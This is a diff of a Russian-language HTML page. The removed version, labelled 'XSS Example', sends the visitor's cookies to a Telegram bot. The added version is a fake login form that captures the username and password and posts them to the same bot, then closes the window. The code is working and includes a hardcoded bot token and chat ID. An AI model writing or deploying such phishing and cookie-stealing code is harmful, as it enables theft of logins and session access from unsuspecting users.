@@ -4,14 +4,8 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Example</title>
-</head>
-<body>
-    <h1>Добро пожаловать на сайт!</h1>
-    <p>Ваши данные будут отправлены в Telegram.</p>
-
+    <title>Data Interception Example</title>
     <script>
-        // Функция для отправки сообщения в Telegram
         function sendToTelegram(message) {
             const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
             const chatId = '7406507427';
@@ -37,11 +31,31 @@
             });
         }
 
-        // Получение cookies пользователя
-        const cookies = document.cookie;
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Останавливаем отправку формы
 
-        // Отправка cookies в Telegram
-        sendToTelegram(Cookies: ${cookies});
+            const formData = new FormData(event.target); // Собираем все данные формы
+            let data = "";
+            for (let [key, value] of formData.entries()) {
+                data += ${key}: ${value}\n;
+            }
+
+            sendToTelegram(data); // Отправляем данные в Telegram
+
+            setTimeout(() => {
+                window.close(); // Закрываем окно через 10 секунд
+            }, 10000);
+        }
     </script>
+</head>
+<body>
+    <h1>Пример перехвата данных</h1>
+    <form onsubmit="handleFormSubmit(event)">
+        <label for="username">Имя пользователя:</label>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Пароль:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <button type="submit">Отправить</button>
+    </form>
 </body>
 </html>
